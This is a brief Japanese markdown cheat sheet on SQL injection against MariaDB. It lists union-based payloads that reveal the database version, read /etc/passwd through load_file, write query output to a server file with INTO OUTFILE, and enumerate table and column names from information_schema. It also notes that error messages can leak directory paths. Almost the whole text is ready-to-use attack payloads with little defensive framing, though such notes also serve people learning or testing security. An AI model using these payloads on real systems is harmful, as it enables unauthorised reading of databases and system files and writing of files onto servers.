# SQLi

* SQL Injection

1. 入力値に`'`を入力してエラーの有無を検証
   1. エラーが帰らない場合もある。
   2. 表示されるエラーからドキュメントルート等のディレクトリ情報がある場合がある。
   3. `' union select version() ; #` でdbのバージョン表示  *MariaDB
   4. `' union select load_file('/etc/passwd'); #`　で`/etc/passwd`のファイル内を表示
   5. `' union select column_name from table_name into outfile '/data/mariadb/test.html' fields terminated by ',' optionally enclosed by '"'; #`でsqlの結果を/data/mariadb/test.htmlに出力(カンマ区切りで"で値を囲む)
   6. `' union select table_name,column_name from information_schema.columns; #` でテーブル名とカラム名を取得
